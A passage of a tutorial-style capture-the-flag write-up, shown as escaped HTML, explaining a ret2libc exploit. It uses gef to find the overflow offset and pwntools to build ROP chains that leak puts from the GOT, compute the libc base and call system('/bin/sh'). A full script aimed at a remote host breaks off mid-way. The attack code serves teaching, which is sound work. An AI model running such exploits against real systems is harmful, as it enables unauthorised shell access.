0x00007fffffffe2b0│+0x0038: 0x0000000100008000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400ee5 &amp;lt;fill+155&amp;gt;       call   0x400670 &amp;lt;printf@plt&amp;gt;
     0x400eea &amp;lt;fill+160&amp;gt;       nop
     0x400eeb &amp;lt;fill+161&amp;gt;       leave
 →   0x400eec &amp;lt;fill+162&amp;gt;       ret
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: &amp;quot;binary&amp;quot;, stopped 0x400eec in fill (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400eec → fill()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0000000000400eec in fill ()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bingo! Program crashed because it tried to jump &amp;amp; execute instructions under the invalid address. Now you can find the address which overwritten return pointer:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  pattern offset $rsp
[+] Searching &#39;$rsp&#39;
[+] Found at offset 40 (little-endian search) likely
[+] Found at offset 33 (big-endian search)
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Protip&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We can find the address in &lt;code&gt;rsp&lt;/code&gt;, because processor failed to execute &lt;code&gt;ret&lt;/code&gt; instruction. &lt;code&gt;rip&lt;/code&gt; still points to problematic instruction.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Protip&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As argument for &lt;em&gt;pattern offset&lt;/em&gt; you can also provide the string or hex number:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  pattern offset faaaaaaagaaaaaaahaa
[+] Searching &#39;faaaaaaagaaaaaaahaa&#39;
[+] Found at offset 40 (big-endian search)

gef➤  pattern offset 0x6161616161616166
[+] Searching &#39;0x6161616161616166&#39;
[+] Found at offset 40 (little-endian search) likely
[+] Found at offset 33 (big-endian search)
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
&lt;p&gt;Save the found offset (40 in my case), we will need it later.&lt;/p&gt;
&lt;h2 id=&#34;develop-the-exploit-ret2libc&#34;&gt;Develop the exploit (ret2libc)&lt;/h2&gt;
&lt;p&gt;The ret2libc consists of several simple steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Leak the libc function&amp;rsquo;s address&lt;/li&gt;
&lt;li&gt;Calculate the address of libc in memory&lt;/li&gt;
&lt;li&gt;Redirect the execution flow to the leaked libc function such as &lt;em&gt;system&lt;/em&gt; to execute the &lt;em&gt;/bin/sh&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Notice!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;All steps needs to be performed during single program execution (due to the randomization). For this you need to have 2 vulnerable functions or just call the vulnerable code twice ;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;pwntools-quick-start&#34;&gt;PWNtools: quick start&lt;/h3&gt;
&lt;p&gt;We are going to start from loading binaries (binary and libc) into the pwntools:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pwn

p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./binary&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;#p = pwn.remote(&amp;#34;138.68.182.108&amp;#34;, 30784)&lt;/span&gt;

pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context(os&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;, arch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;#pwn.context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;

elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./binary&amp;#34;&lt;/span&gt;)
libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./libc.so.6&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Protip&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;If you want to perform this code remotely then uncomment &lt;code&gt;pwn.remote&lt;/code&gt; (&amp;amp; comment &lt;code&gt;pwn.process&lt;/code&gt;), for debug logs uncomment &lt;code&gt;pwn.context.log_level = &#39;debug&#39;&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Now we can pretty easily use the binaries meta information such us stored symbols, etc.&lt;/p&gt;
&lt;p&gt;It might happen that vulnerable code is stored behind some menus, for navigation through program you can use several functions:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# receive stdout until this substring&lt;/span&gt;
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;)       &lt;span style=&#34;color:#75715e&#34;&gt;# receive n number of bytes&lt;/span&gt;
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()       &lt;span style=&#34;color:#75715e&#34;&gt;# receive stdout until new line&lt;/span&gt;

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;foo&amp;#39;&lt;/span&gt;)     &lt;span style=&#34;color:#75715e&#34;&gt;# send bytes&lt;/span&gt;
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;foo&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# send &amp;#39;foo\n&amp;#39; (with new line character)&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# optionally use the timeout parameter to wait for output&lt;/span&gt;
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;leak-address&#34;&gt;Leak address&lt;/h2&gt;
&lt;p&gt;So, now you managed to load the binary, execute it and navigate to vulnerable functionallity.&lt;/p&gt;
&lt;p&gt;Now it&amp;rsquo;s time to create the payload - the easiest way to achieve it is to use &lt;em&gt;ROP&lt;/em&gt; module&lt;/p&gt;
&lt;p&gt;In the code below I am constructing the ROP chain which will:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Fill the buffer (32 bytes)&lt;/li&gt;
&lt;li&gt;Overwrite the saved base pointer on stack (8 bytes)&lt;/li&gt;
&lt;li&gt;Call &lt;code&gt;puts&lt;/code&gt; to leak GOT puts address&lt;/li&gt;
&lt;li&gt;Redirect the execution flow to the same, vulnerable function (&lt;em&gt;fill&lt;/em&gt; in my case)&lt;/li&gt;
&lt;li&gt;Joins the fill bytes with ROP chain&lt;/li&gt;
&lt;li&gt;Sends the payload&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;fill &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;
rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ROP(elf)
rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts&amp;#34;&lt;/span&gt;], [elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts&amp;#34;&lt;/span&gt;]])
rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fill&amp;#34;&lt;/span&gt;])
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join([fill, rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chain()])
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Under the hood of &lt;code&gt;rop.call&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In different architectures functions are called using specific &lt;em&gt;call conventions&lt;/em&gt;&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;. For example in linux x8664: 1st argument of function is always passed via &lt;code&gt;rdi&lt;/code&gt; registry. If we want to to call the function with argument we need to make sure that argument value is stored in the mentioned registry.&lt;/p&gt;
&lt;p&gt;For that we create the ROP chain which will:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Jump to the code containing instructions taking the argument from stack and placing it in &lt;code&gt;rdi&lt;/code&gt;  (&lt;code&gt;pop rdi&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;Take address to jump from stack and jump to it (&lt;code&gt;ret&lt;/code&gt;).&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In general &lt;code&gt;rop.call&lt;/code&gt; chain will look like that:&lt;code&gt;&amp;lt;pop rdi; ret addr&amp;gt; &amp;lt;arg&amp;gt; &amp;lt;func_addr&amp;gt;&lt;/code&gt; (pwntools is capable of finding gadgets needed to call the function will all arguments).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;PLT vs GOT&lt;/strong&gt;&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PLT - Procedure Linkage Table, contain stubs to jump to the target&lt;/li&gt;
&lt;li&gt;GOT - tables of the target addresses (resolved runtime)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can find these values by yourself:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ objdump -D ./binary| grep puts
&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000400650&lt;/span&gt; &amp;lt;puts@plt&amp;gt;:
  400650:       ff &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;       jmpq   *0x201952&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%rip&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 601fa8 &amp;lt;puts@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can interpret above output as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PLT address = &lt;code&gt;0x400650&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;GOT entry = &lt;code&gt;0x601fa8&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;After sending such prepared payload to the program the stack should look like that:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;+----------------+
|  ptr_plt_puts  |   &amp;lt;- pointer to puts function which will be executed
+----------------+
|  ptr_got_puts  |   &amp;lt;- address to entry of puts in GOT, value will be printed by puts above
+----------------+
|   ptr_poprdi   |   &amp;lt;- pointer to pop rdi; ret
+----------------+
|                |
|      fill      |   &amp;lt;- our &amp;quot;fill&amp;quot;, which just overflows the buffer and saved rbp
|     (A*40)     |
|                |
+----------------+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now we need to parse the output, this part is individual for each program. I really recommend enabling debugging output which will show transfered data.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Protip - Enable Debug Mode&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# parse leaked address&lt;/span&gt;
raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()  &lt;span style=&#34;color:#75715e&#34;&gt;# \&lt;/span&gt;
raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:]     &lt;span style=&#34;color:#75715e&#34;&gt;# - skip unnecesary data&lt;/span&gt;

leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fill missing bytes with zeroes&lt;/span&gt;
leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(leaked_puts)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Packing and Unpacking the bytes&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;pwntools contains built-in functions for &lt;strong&gt;p&lt;/strong&gt;acking and &lt;strong&gt;u&lt;/strong&gt;npacking bytes - conversion of bytes between the strings and ints according to set environment with &lt;code&gt;context&lt;/code&gt; function (endianness is set automatically).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4142424245464748&lt;/span&gt;)
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HGFEBBBA&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HEXIFYIT&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#ae81ff&#34;&gt;6073483730898928968&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x5449594649584548&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;
&lt;h2 id=&#34;run-binsh&#34;&gt;Run /bin/sh&lt;/h2&gt;
&lt;p&gt;The &amp;ldquo;last&amp;rdquo; step consists of the following substeps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Calculate the address of libc in memory&lt;/li&gt;
&lt;li&gt;Calculate the address of &lt;code&gt;system()&lt;/code&gt; function and its argument (&lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Prepare the ropchain &amp;amp; pass it as argument&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Ok, but why?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;You might  wondering here why not just call the &lt;code&gt;system()&lt;/code&gt; directly in the previous step. It seems to be might simpler, than whole play with calling the same function once again.&lt;/p&gt;
&lt;p&gt;The reason is simple: there is no &lt;code&gt;system&lt;/code&gt; plt entry in our binary, so we can&amp;rsquo;t call it:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ objdump -D ./binary| grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# empty output&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We don&amp;rsquo;t have it in our binary, so we need to find it in the memory by tracing common functions - in our case &lt;code&gt;puts&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Stage 2, ret2shell&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# calculate offset, base address of the libc in the memory&lt;/span&gt;
libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;]

&lt;span style=&#34;color:#75715e&#34;&gt;# prepare the final payload&lt;/span&gt;
rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ROP(libc)
rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_gadget([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ret&amp;#39;&lt;/span&gt;])) &lt;span style=&#34;color:#75715e&#34;&gt;# just for fixing padding, you might not need it&lt;/span&gt;
rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;], [next(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;search(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;))]) &lt;span style=&#34;color:#75715e&#34;&gt;# with null-byte to make sure that we don&amp;#39;t try to execute some /bin/sh appended with garbage like &amp;#39;/bin/shFEFE&amp;#39; which obviously doesn&amp;#39;t exists in linux&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join([fill, rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chain()])

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The last line (&lt;code&gt;p.interactive()&lt;/code&gt;) spawns the interactive shell:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ ps
  PID TTY          TIME CMD
   &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; ?        00:00:00 binary
   &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; ?        00:00:00 sh
   &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; ?        00:00:00 sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;full-script&#34;&gt;Full script&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pwn

&lt;span style=&#34;color:#75715e&#34;&gt;#p = pwn.process(&amp;#39;./binary&amp;#39;)&lt;/span&gt;
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;138.68.182.108&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30784&lt;/span&gt;)

pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context(os&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;, arch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;#pwn.context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;

elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./binary&amp;#34;&lt;/span&gt;)
libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./libc.so.6&amp;#34;&lt;/span&gt;)

pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Stage 1, leak puts addr&amp;#34;&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# prepare payload&lt;/span&gt;
fill &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;
rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ROP(elf)
rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts&amp;#34;&lt;/span&gt;], [elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts&amp;#34;&lt;/span&gt;]])
